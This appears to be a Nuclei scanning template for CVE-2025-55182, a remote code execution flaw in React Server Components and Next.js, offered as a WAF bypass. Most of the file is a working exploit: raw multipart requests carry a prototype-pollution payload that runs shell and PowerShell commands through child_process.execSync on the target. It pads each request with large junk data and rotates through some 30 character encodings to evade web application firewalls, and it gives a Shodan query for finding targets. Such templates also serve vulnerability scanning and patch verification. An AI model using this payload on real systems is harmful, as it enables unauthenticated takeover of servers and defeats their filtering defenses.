id: CVE-2025-55182-Bypass-Waf

info:
  name: React Server Components - Remote Code Execution
  author: momika233
  severity: critical
  description: |
    React Server Components 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including react-server-dom-parcel,
    react-server-dom-turbopack, and react-server-dom-webpack contain a remote code execution caused
    by unsafe deserialization of payloads from HTTP requests to Server Function endpoints, letting
    unauthenticated attackers execute arbitrary code remotely, exploit requires no authentication.
  impact: |
    Unauthenticated attackers can execute arbitrary code remotely, potentially leading to full system compromise.
  remediation: |
    Update to the latest version that fixes the unsafe deserialization issue.
  reference:
    - https://github.com/assetnote/react2shell-scanner
    - https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
    - https://www.facebook.com/security/advisories/cve-2025-55182
    - http://www.openwall.com/lists/oss-security/2025/12/03/4
    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
    - https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp
    - https://vercel.com/changelog/cve-2025-55182
    - https://github.com/Chocapikk/CVE-2025-55182
    - https://x.com/momika233
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2025-55182
    cwe-id: CWE-502
    epss-score: 0.46718
    epss-percentile: 0.97572
  metadata:
    verified: true
    max-request: 50
    shodan-query: http.component:"Next.js"
  tags: cve,cve2025,react,rce,nextjs,oast,kev,vkev

variables:
  request-id: "{{to_lower(rand_text_alphanumeric(8))}}"
  nextjs-html: "{{rand_text_alphanumeric(21)}}"
  num1: "{{rand_int(40000, 44800)}}"
  num2: "{{rand_int(40000, 44800)}}"
  result: "{{to_number(num1) * to_number(num2)}}"
  bypass_data: "{{rand_text_alphanumeric(50000)}}"
  b: "{{rand_text_alphanumeric(16)}}"

http:
  - attack: batteringram
    stop-at-first-match: true
    redirects: true

    payloads:
      ct:
        # Unicode / Special Code
        - "charset=utf-16le"
        - "charset=utf-16be"
        - "charset=utf-32"
        - "charset=utf-7"
        - "charset=utf-8"
        - "charset=ibm-037"
        - "charset=iso-2022-jp"

        # Windows Code Page
        - "charset=windows-1250"
        - "charset=windows-1251"
        - "charset=windows-1253"
        - "charset=windows-1254"
        - "charset=windows-1255"
        - "charset=windows-1256"
        - "charset=windows-1257"
        - "charset=windows-1258"

        # ISO-8859 Expand
        - "charset=iso-8859-2"
        - "charset=iso-8859-3"
        - "charset=iso-8859-5"
        - "charset=iso-8859-6"
        - "charset=iso-8859-7"
        - "charset=iso-8859-8"
        - "charset=iso-8859-9"
        - "charset=iso-8859-10"
        - "charset=iso-8859-13"
        - "charset=iso-8859-14"
        - "charset=iso-8859-15"
        - "charset=iso-8859-16"

        # Russian / Ukrainian
        - "charset=koi8-r"
        - "charset=koi8-u"

    raw:
      - |
        @timeout 15s
        POST / HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        X-Nextjs-Html-Request-Id: {{nextjs-html}}
        Content-Type: multipart/form-data; boundary=----{{b}}

        ------{{b}}
        Content-Disposition: form-data; name="rebroadcast_4cPe"

        {{bypass_data}}
        ------{{b}}
        Content-Disposition: form-data; name="0"
        Content-Type: {{ct}}

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(({{num1}}*{{num2}}))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------{{b}}
        Content-Disposition: form-data; name="1"

        "$@0"
        ------{{b}}
        Content-Disposition: form-data; name="2"

        []
        ------{{b}}--

      - |
        @timeout 15s
        POST / HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        X-Nextjs-Html-Request-Id: {{nextjs-html}}
        Content-Type: multipart/form-data; boundary=----{{b}}

        ------{{b}}
        Content-Disposition: form-data; name="rebroadcast_4cPe"

        {{bypass_data}}
        ------{{b}}
        Content-Disposition: form-data; name="0"
        Content-Type: {{ct}}

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('powershell -c \"{{num1}}*{{num2}}\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------{{b}}
        Content-Disposition: form-data; name="1"

        "$@0"
        ------{{b}}
        Content-Disposition: form-data; name="2"

        []
        ------{{b}}--

    matchers:
      - type: dsl
        dsl:
         - "contains(to_lower(header), 'x-action-redirect: /login?a={{result}}')"